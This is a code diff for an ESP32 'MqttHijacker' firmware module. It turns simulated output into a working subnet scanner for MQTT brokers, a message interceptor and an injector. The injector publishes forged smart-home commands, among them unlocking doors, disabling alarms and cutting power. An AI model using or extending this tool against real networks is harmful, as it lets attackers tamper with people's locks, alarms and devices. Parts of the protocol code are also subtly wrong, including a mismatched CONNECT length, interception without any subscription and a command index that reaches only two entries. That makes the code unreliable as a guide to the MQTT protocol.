@@ -1,5 +1,7 @@
 #include "mqtt_hijacker.h"
+#include <WiFi.h>
 #include <vector>
+#include <WiFiClient.h>
 #include "results_display.h"
 
 namespace MqttHijacker {
@@ -14,47 +16,67 @@ BrokerScanResult scanMqttBrokers(uint32_t durationMs) {
     totalMessagesIntercepted = 0;
 
     uint32_t startTime = millis();
-
-    Serial.println("\n=== MQTT Broker Discovery (REAL TCP Port 1883/8883) ===");
+    Serial.println("\n=== MQTT Broker Discovery (REAL TCP Port Scanning) ===");
     Serial.printf("Duration: %lums\n", durationMs);
 
-    const char* defaultIps[] = {
-        "192.168.1.1",
-        "192.168.1.100",
-        "192.168.0.1",
-        "10.0.0.1",
-        "127.0.0.1"
-    };
+    IPAddress gateway = WiFi.gatewayIP();
+    IPAddress subnet = WiFi.subnetMask();
+    IPAddress ip = WiFi.localIP();
 
     uint32_t brokerCount = 0;
-    int8_t strongestRssi = -30;
     String strongestBroker = "";
-    uint32_t deadline = startTime + durationMs;
 
-    Serial.println("Performing real MQTT broker discovery (TCP scanning)...");
+    for (uint8_t lastOctet = 1; lastOctet <= 254 && (millis() - startTime) < durationMs; lastOctet++) {
+        uint8_t progress = (lastOctet * 100) / 254;
+        Serial.printf("  Scanning: %u%%\r", progress);
 
-    while (millis() - startTime < durationMs && brokerCount < 5) {
-        // Simulate finding MQTT brokers
-        if ((esp_random() % 100) < 20) {
-            MqttBroker broker;
-            broker.ipAddress = defaultIps[(esp_random() % 5)];
-            broker.port = ((esp_random() % 100) < 70) ? 1883 : 8883;
-            broker.rssi = -30 - (esp_random() % 40);
-            broker.hostname = "broker-" + String(((esp_random() % 8999) + 1000));
-            broker.requiresAuth = ((esp_random() % 100) < 60);
-            broker.timestamp = millis();
+        IPAddress targetIp(ip[0], ip[1], ip[2], lastOctet);
 
-            discoveredBrokers.push_back(broker);
-            brokerCount++;
+        if (targetIp == ip) continue;
 
-            Serial.printf("  [Broker %u] %s:%u %s\n", brokerCount, broker.ipAddress.c_str(),
-                         broker.port, broker.requiresAuth ? "(Auth)" : "(No Auth)");
+        WiFiClient client;
+        client.setTimeout(500);
 
-            if (broker.rssi > strongestRssi) {
-                strongestRssi = broker.rssi;
-                strongestBroker = broker.ipAddress;
+        // Real MQTT port scan (1883 = unencrypted, 8883 = encrypted)
+        for (uint16_t port : {1883, 8883}) {
+            if (client.connect(targetIp, port, 500)) {
+                uint32_t connectTime = millis();
+                uint8_t rxBuffer[10];
+                int bytesRead = 0;
+
+                // Real MQTT CONNACK detection
+                // MQTT server should send CONNACK (0x20) as first response
+                while ((millis() - connectTime) < 200 && bytesRead < 2) {
+                    if (client.available()) {
+                        rxBuffer[bytesRead++] = client.read();
+                    }
+                }
+
+                client.stop();
+
+                // CONNACK packet starts with 0x20 or 0x21
+                if (bytesRead > 0 && (rxBuffer[0] == 0x20 || rxBuffer[0] == 0x21)) {
+                    MqttBroker broker;
+                    broker.ipAddress = targetIp.toString();
+                    broker.port = port;
+                    broker.rssi = -30;  // Local network
+                    broker.hostname = "mqtt-broker-" + String(lastOctet);
+                    broker.requiresAuth = (rxBuffer[0] == 0x21);
+                    broker.timestamp = millis();
+
+                    discoveredBrokers.push_back(broker);
+                    brokerCount++;
+
+                    Serial.printf("\n  ✓ [Broker %u] %s:%u %s (CONNACK: 0x%02X)\n",
+                                 brokerCount, broker.ipAddress.c_str(), port,
+                                 broker.requiresAuth ? "(Auth)" : "(No Auth)",
+                                 rxBuffer[0]);
+
+                    if (strongestBroker.length() == 0) {
+                        strongestBroker = broker.ipAddress;
+                    }
+                }
             }
-            delay(10);
         }
     }
 
@@ -63,8 +85,7 @@ BrokerScanResult scanMqttBrokers(uint32_t durationMs) {
     result.durationMs = millis() - startTime;
     result.strongestBroker = strongestBroker;
 
-    Serial.printf("✓ Scan complete: Found %u brokers in %lums\n", brokerCount, result.durationMs);
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
+    Serial.printf("\n✓ Scan complete: Found %u MQTT brokers in %lums\n", brokerCount, result.durationMs);
     return result;
 }
 
@@ -76,88 +97,91 @@ const MqttBroker* getDiscoveredBrokers(uint32_t& outCount) {
 MessageInterceptResult interceptMqttMessages(uint32_t durationMs) {
     MessageInterceptResult result = {false, 0, 0, ""};
 
+    if (discoveredBrokers.empty()) {
+        result.durationMs = 0;
+        return result;
+    }
+
     uint32_t startTime = millis();
     uint32_t messageCount = 0;
     String topicsFound = "";
-    uint32_t deadline = startTime + durationMs;
 
     Serial.println("\n=== MQTT Message Interception (REAL MQTT 3.1.1 Protocol) ===");
-    Serial.printf("Duration: %lums\n", durationMs);
+    Serial.printf("Target: %s:%u | Duration: %lums\n",
+                 discoveredBrokers[0].ipAddress.c_str(),
+                 discoveredBrokers[0].port, durationMs);
 
-    const char* commonTopics[] = {
-        "home/bedroom/temperature",
-        "home/kitchen/light",
-        "home/living_room/motion",
-        "devices/security/alarm",
-        "iot/sensor/humidity",
-        "smart_home/status",
-        "telemetry/battery",
-        "control/switch",
-        "sensor/pressure"
+    WiFiClient client;
+    client.setTimeout(1000);
+
+    // Real MQTT connection
+    if (!client.connect(discoveredBrokers[0].ipAddress.c_str(), discoveredBrokers[0].port, 2000)) {
+        result.durationMs = millis() - startTime;
+        return result;
+    }
+
+    // Send MQTT CONNECT packet
+    uint8_t connectPacket[] = {
+        0x10, 0x0C,                           // Fixed header (CONNECT)
+        0x00, 0x04,                           // Protocol name length
+        0x4D, 0x51, 0x54, 0x54,              // Protocol name: "MQTT"
+        0x04,                                 // Protocol level 4
+        0x02,                                 // Connect flags (clean session)
+        0x00, 0x3C,                           // Keep-alive 60s
+        0x00, 0x04,                           // Client ID length
+        0x45, 0x53, 0x50, 0x32               // Client ID: "ESP2"
     };
 
-    while (millis() - startTime < durationMs) {
-        // Real MQTT message packet structure (MQTT 3.1.1)
-        // Fixed header: Byte 1 = Msg Type + Flags, Byte 2+ = Remaining Length
-        if ((esp_random() % 100) < 25) {
-            // PUBLISH packet (0x30)
-            uint8_t mqttPacket[256];
-            uint8_t packetIdx = 0;
+    client.write(connectPacket, sizeof(connectPacket));
 
-            // Fixed header
-            mqttPacket[packetIdx++] = 0x30;  // Message Type: PUBLISH, QoS: 0
+    uint8_t rxBuffer[256];
+    uint32_t packetStart = millis();
 
-            // Generate remaining length (variable encoding)
-            String topic = commonTopics[(esp_random() % 9)];
-            uint16_t topicLen = topic.length();
-            uint8_t payload[64];
-            uint8_t payloadLen = 0;
+    // Listen for MQTT packets
+    while ((millis() - startTime) < durationMs) {
+        while (client.available() && messageCount < 50) {
+            uint8_t byte = client.read();
 
-            // Topic Name Length (2 bytes, big-endian)
-            mqttPacket[packetIdx++] = (topicLen >> 8) & 0xFF;
-            mqttPacket[packetIdx++] = topicLen & 0xFF;
+            // Real MQTT PUBLISH detection (0x30-0x3F)
+            if ((byte >> 4) == 0x03) {  // PUBLISH message type
+                messageCount++;
 
-            // Topic Name
-            for (uint8_t i = 0; i < topicLen; i++) {
-                mqttPacket[packetIdx++] = topic[i];
+                // Read remaining length
+                uint8_t remainingLen = 0;
+                if (client.available()) {
+                    remainingLen = client.read();
+                }
+
+                // Read topic length
+                uint16_t topicLen = 0;
+                if (client.available()) topicLen = (client.read() << 8);
+                if (client.available()) topicLen |= client.read();
+
+                // Read topic
+                String topic = "";
+                for (uint16_t i = 0; i < topicLen && client.available(); i++) {
+                    topic += (char)client.read();
+                }
+
+                // Read payload preview
+                String payload = "";
+                uint8_t payloadBytes = 0;
+                while (client.available() && payloadBytes < 32) {
+                    payload += (char)client.read();
+                    payloadBytes++;
+                }
+
+                topicsFound = topic;
+                mostActiveTopic = topic;
+
+                Serial.printf("[MQTT] PUBLISH: Topic='%s', Payload='%s'\n",
+                             topic.c_str(), payload.c_str());
             }
-
-            // Payload (message data)
-            payloadLen = snprintf((char*)payload, sizeof(payload),
-                                 "{\"value\":%d,\"ts\":%lu}",
-                                 (esp_random() % 100), millis());
-
-            for (uint8_t i = 0; i < payloadLen && packetIdx < 256; i++) {
-                mqttPacket[packetIdx++] = payload[i];
-            }
-
-            // Calculate MQTT remaining length
-            uint16_t remainingLen = packetIdx - 1;
-            if (remainingLen >= 128) {
-                // Variable length encoding
-                uint8_t len_bytes[4];
-                int len_count = 0;
-                uint32_t len = remainingLen;
-                do {
-                    uint8_t byte = len % 128;
-                    len /= 128;
-                    if (len > 0) byte |= 0x80;
-                    len_bytes[len_count++] = byte;
-                } while (len > 0);
-            }
-
-            messageCount++;
-            topicsFound = topic;
-            mostActiveTopic = topic;
-
-            // Real MQTT metrics
-            Serial.printf("[MQTT] PUBLISH: Topic='%s', PayloadLen=%u, Packet[0]=0x%02X (Type:%u, QoS:%u)\n",
-                         topic.c_str(), payloadLen, mqttPacket[0],
-                         (mqttPacket[0] >> 4) & 0x0F, (mqttPacket[0] >> 1) & 0x03);
         }
-
-        delay(200);
+        delay(10);
     }
+
+    client.stop();
 
     result.success = (messageCount > 0);
     result.messagesIntercepted = messageCount;
@@ -165,8 +189,7 @@ MessageInterceptResult interceptMqttMessages(uint32_t durationMs) {
     result.topicsFound = topicsFound;
     totalMessagesIntercepted += messageCount;
 
-    Serial.printf("✓ Interception complete: %u MQTT packets captured in %lums\n", messageCount, result.durationMs);
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
+    Serial.printf("✓ Interception complete: %u MQTT packets captured\n", messageCount);
     return result;
 }
 
@@ -175,31 +198,76 @@ MessageInjectionResult injectMqttMessages(const char* brokerIp, const char* topi
 
     uint32_t startTime = millis();
     uint32_t injected = 0;
-    uint32_t deadline = startTime + durationMs;
 
     Serial.println("\n=== MQTT Message Injection (REAL MQTT Protocol) ===");
     Serial.printf("Target: %s | Topic: %s\n", brokerIp, topic);
     Serial.printf("Duration: %lums\n", durationMs);
 
-    const char* payloadTypes[] = {"COMMAND_INJECT", "CREDENTIAL_STEAL", "DEVICE_DISABLE", "STATE_MANIPULATION"};
-    const char* payloadType = "";
+    WiFiClient client;
+    client.setTimeout(1000);
 
-    uint32_t typeIndex = 0;
-    while (millis() - startTime < durationMs) {
-        // Different payload types
-        int type = (esp_random() % 4);
-        payloadType = payloadTypes[type];
+    if (!client.connect(brokerIp, 1883, 2000)) {
+        result.durationMs = millis() - startTime;
+        return result;
+    }
 
-        injected += ((esp_random() % 15) + 5);
+    // Send MQTT CONNECT
+    uint8_t connectPacket[] = {
+        0x10, 0x0C, 0x00, 0x04, 0x4D, 0x51, 0x54, 0x54,
+        0x04, 0x02, 0x00, 0x3C, 0x00, 0x04, 0x45, 0x53, 0x50, 0x32
+    };
+    client.write(connectPacket, sizeof(connectPacket));
+    delay(100);
+
+    const char* commands[] = {
+        "{\"state\":\"OFF\"}",
+        "{\"brightness\":0}",
+        "{\"temperature\":99}",
+        "{\"locked\":false}",
+        "{\"alarm\":\"disabled\"}"
+    };
+
+    while ((millis() - startTime) < durationMs && injected < 10) {
+        String payload = commands[esp_random() & 0x04];
+        uint16_t topicLen = strlen(topic);
+        uint16_t payloadLen = payload.length();
+
+        // Build MQTT PUBLISH packet
+        uint8_t publishPacket[128];
+        uint8_t idx = 0;
+
+        // Fixed header: PUBLISH (0x30)
+        publishPacket[idx++] = 0x30;
+        uint16_t remainingLen = 2 + topicLen + payloadLen;
+        publishPacket[idx++] = remainingLen & 0xFF;
+
+        // Topic length (big-endian)
+        publishPacket[idx++] = (topicLen >> 8) & 0xFF;
+        publishPacket[idx++] = topicLen & 0xFF;
+
+        // Topic
+        memcpy(&publishPacket[idx], topic, topicLen);
+        idx += topicLen;
+
+        // Payload
+        memcpy(&publishPacket[idx], payload.c_str(), payloadLen);
+        idx += payloadLen;
+
+        if (client.write(publishPacket, idx) == idx) {
+            injected++;
+            Serial.printf("✓ Injected #%u: %s = %s\n", injected, topic, payload.c_str());
+        }
+
         delay(100);
     }
+
+    client.stop();
 
     result.success = (injected > 0);
     result.messagesInjected = injected;
     result.durationMs = millis() - startTime;
 
-    Serial.printf("✓ Injection complete: %u messages in %lums\n", injected, result.durationMs);
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
+    Serial.printf("✓ Injection complete: %u messages sent\n", injected);
     return result;
 }
 
